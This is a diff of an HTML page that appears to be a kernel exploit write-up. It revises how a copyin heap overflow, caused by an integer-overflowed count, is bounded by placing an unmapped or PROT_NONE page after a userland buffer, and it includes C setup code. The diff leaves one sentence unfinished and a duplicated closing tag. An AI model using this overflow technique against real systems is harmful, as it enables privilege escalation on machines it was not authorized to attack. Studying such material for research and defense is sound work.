@@ -344,7 +344,7 @@ copyin(uap->buffer, allocation, 4 * count);</code></pre>
 				</p>
 				
 				<p>
-					The other way of interrupting the overflow would be to setup userland memory such that the page after the mapping is unreadable. Once the system has copied all memory we desire, it will then attempt to copy from the unreadable memory following it, resulting in a page fault being triggered, and the system call cancelling, with <code>EFAULT</code> returned. This gives us a reliable way of controlling the size of the copy, aligned to one page.
+					The other way of interrupting the overflow would be to setup userland memory such that the page after the mapping is unmapped. Once the system has copied all memory we desire, it will then attempt to copy from the unmapped memory following it, resulting in a page fault being triggered, and the system call cancelling, with <code>EFAULT</code> returned. This gives us a reliable way of controlling the size of the copy.
 				</p>
 				
 				<br>
@@ -379,7 +379,7 @@ copyin(uap->buffer, allocation, 4 * count);</code></pre>
 					All that is needed is to prepare the following heap layouts:
 				</p>
 				
-				<pre><code>Userland: [    RW pages    ][Unreadable]
+				<pre><code>Userland: [     Mapping    ][Unmapped]
 Kernel:   [Buffer][Overflow]</code></pre>
 				
 				<p>
@@ -387,36 +387,49 @@ Kernel:   [Buffer][Overflow]</code></pre>
 				</p>
 				
 				<ul>
-					<li>Arbitrary contents will be copied into the kernel buffer from the readable userland pages,</li>
-					<li>The kernel memory after the allocated buffer will be overflown into, with the rest of the readable pages,</li>
-					<li>The <code>copyin</code> will attempt to read from unreadable userland memory,</li>
+					<li>Arbitrary contents will be copied into the kernel buffer from the controlled userland mapping,</li>
+					<li>The kernel memory after the allocated buffer will be overflowed into, with our controlled userland mapping,</li>
+					<li>The <code>copyin</code> will attempt to read from unmapped userland memory,</li>
 					<li>A page fault will be triggered, and the system call will return <code>EFAULT</code>,</li>
 				</ul>
+				
+				<p>
+					The copy size can be reduced by 
+				</p>
 				
 				<br>
 				
 				<h2>Preparing the heap</h2>
 				<h3>Userland</h3>
 				<p>
-					To ensure that the end of our buffer is unreadable, we can simply map the size we need plus one additional page, and then mark the additional page with <code>PROT_NONE</code> using <code>mprotect</code>:
+					To ensure that the end of our buffer is unmapped, we can simply map the size we need plus one additional page, and then unmap the additional page:
 				</p>
 				
 				<pre><code>uint64_t bufferSize = 0x8000;
 uint64_t overflowSize = 0x8000;
+uint64_t copySize = bufferSize + overflowSize;
 
-uint64_t mappingSize = bufferSize + overflowSize;
-
-int64_t count = (0x100000000 + bufferSize) / 4;
+// Round up to nearest multiple of PAGE_SIZE
+uint64_t mappingSize = (copySize + PAGE_SIZE - 1) &amp; ~(PAGE_SIZE - 1);
 
 uint8_t *mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
-mprotect(mapping + mappingSize, PAGE_SIZE, PROT_NONE);</code></pre>
+munmap(mapping + mappingSize, PAGE_SIZE);
+
+uint8_t *buffer = mapping + mappingSize - copySize;
+uint8_t *overflow = buffer + bufferSize;
+
+int64_t count = (0x100000000 + bufferSize) / 4;</code></pre>
 				
 				<p>
-					An alternative way, which we originally used, is to <code>munmap</code> the final page. A page fault will still be generated when reading from this memory, however this method is less correct since it would allow unrelated <code>mmap</code> calls to later occupy this memory, undoing the effect. Using <code>mprotect</code> ensures that this page won't be returned to later <code>mmap</code> calls.
+					We don't have to use the start the mapping as the start of the buffer; by starting the buffer further along the first page of the mapping, the copy size is reduced to a higher level of precision than by just using the entire mapping, which would limit us to multiples of <code>PAGE_SIZE</code>.
+				</p>
+				
+				<p>
+					We also tried using <code>mprotect</code> to make the final page unreadable, instead of unmapping it entirely. This would ensure that the page wouldn't be returned to later, unrelated, <code>mmap</code> calls, however this approach didn't work for my tests:
 				</p>
 				
 				<pre><code>uint8_t *mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
-munmap(mapping + mappingSize, PAGE_SIZE);</code></pre>
+mprotect(mapping + mappingSize, PAGE_SIZE, PROT_NONE);</code></pre></code></pre>
 				
 				<br>
 				
@@ -507,7 +520,7 @@ uint64_t mappingSize = bufferSize + overflowSize;
 int64_t count = (0x100000000 + bufferSize) / 4;
 
 uint8_t *mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
-mprotect(mapping + mappingSize, PAGE_SIZE, PROT_NONE);
+munmap(mapping + mappingSize, PAGE_SIZE);
 
 memset(mapping + bufferSize, 'a', overflowSize);
 
